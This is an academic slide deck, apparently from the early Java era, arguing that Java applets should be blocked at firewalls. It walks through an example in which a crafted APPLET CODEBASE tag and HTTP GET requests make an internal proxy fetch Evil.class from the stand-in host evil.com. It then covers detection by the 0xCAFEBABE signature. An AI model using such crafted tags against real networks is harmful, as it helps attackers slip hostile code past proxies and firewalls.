BBlloocckkiinngg JJaavvaa AApppplleettss aatt tthhee
FFiirreewwaallll
D. Martin, BU
S. Rajagopalan, Bellcore
A. Rubin, AT&T ResearchOutline
n Why should applets be blocked?
n How can applets be blocked at the
firewall?
Evil.com
Victim
Amanax 4.1.3Why should applets be blocked?
n Insider attacks are the worst.
n The ubiquity of Java-enabled browsers
effectively transforms outsider attacks
into insider attacks.
– “But isn’t this mitigated by the security
restrictions imposed on applets?”Yes, but...
n Sometimes the security mechanisms
themselves can be broken, penetrating
the restrictions of the sandbox.
[Princeton attacks]
n And the mechanisms don’t prevent an
applet from enlisting the firewall’s hhheeelllppp
in violating the security policy.Example policy & mechanism
Policy:
Applets are only permitted to open “safe”
TCP connections.
Mechanism
:
The SecurityManager only allows outgoing
TCP connections to the server that
delivered the applet.
This isn’t enough!1: ClassLoader starts obtaining
Evil.class
ClassLoader
Ok, applet lives on
fido.xxx.com fido.xxx.com
proxy.xxx.com
<APPLET CODEBASE=“http://fido.xxx.com/http://evil.com/”
CODE=Evil> </APPLET>2. Netscape routes request
through proxy.xxx.com
ClassLoader
Fetching applet from
fido.xxx.com
fido.xxx.com
(via proxy.xxx.com)
proxy.xxx.com
GET http://fido.xxx.com/http://evil.com/Evil.class HTTP/1.03. Proxy.xxx.com contacts itself as
fido.xxx.com
ClassLoader
Still fetching applet
from fido.xxx.com
fido.xxx.com
(via proxy.xxx.com)
proxy.xxx.com
GET http://evil.com/Evil.class HTTP/1.04. Fido.xxx.com fetches Evil.class
from evil.com and delivers it to
proxy.xxx.com and the
ClassLoader
victim
Now receiving applet
from fido.xxx.com
fido.xxx.com
(via proxy.xxx.com)
proxy.xxx.com
0x CA FE BA BE 00 03 ...
evil.comA Bump in the Net
n The applet came from fido.xxx.com, so it
may “only” open TCP connections to
fido.xxx.com.
n Fido.xxx.com is a proxy server designed
to forward TCP streams to
arbitrary destinations.
n This violates the security
policy.How to block applets at the
firewall
n Remove <applet> tags from HTML
– Extremely difficult to get right.
– Only possible strategy for Javascript &
ActiveX.
n Detect Java class file signature
0xCA FE BA BE
– Even this can be disguised.
n It’s not easy, and it’s getting harder.Conclusions
n Applets can be a threat even when the
Java security system is working.
n Firewalls can no longer trust insiders just
because they’re inside.
– Authenticate insiders.
n Blocking applets at the firewall is hard.
n General solutions involve changes at the
workstation level, not just the firewall.